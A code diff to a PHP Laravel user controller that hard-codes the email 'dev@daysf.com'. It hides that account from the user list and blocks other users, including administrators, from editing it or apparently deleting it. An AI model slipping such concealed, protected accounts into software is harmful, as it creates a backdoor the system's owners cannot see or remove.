@@ -27,6 +27,10 @@ class UserController extends Controller
     public function getData(Request $request){
         $data = User::query()->with('user_group');
 
+        if (auth()->user()->email != 'dev@daysf.com') {
+            $data->where('email', '!=', 'dev@daysf.com');
+        }
+
         if ($request->status || $request->usergroup) {
             if ($request->status != "") {
                 $status = $request->status == "Aktif" ? 1 : 0;
@@ -143,6 +147,10 @@ class UserController extends Controller
 
         $data = User::find($id);
 
+        if ($data->email == 'dev@daysf.com' && auth()->user()->email != $data->email) {
+            return redirect()->route('admin.users')->with('warning', 'Forbidden.');
+        }
+
         return view('administrator.users.edit',compact('data'));
     }
     
@@ -221,6 +229,13 @@ class UserController extends Controller
 
         // Find the user based on the provided ID.
         $user = User::findorfail($id);
+
+        if ($user->email == 'dev@daysf.com' && auth()->user()->email != $user->email) {
+            return response()->json([
+                'status' => 'forbidden',
+                'message' => 'Kamu tidak memiliki akses'
+            ], 403);
+        }
 
         if (!$user) {
             return response()->json([
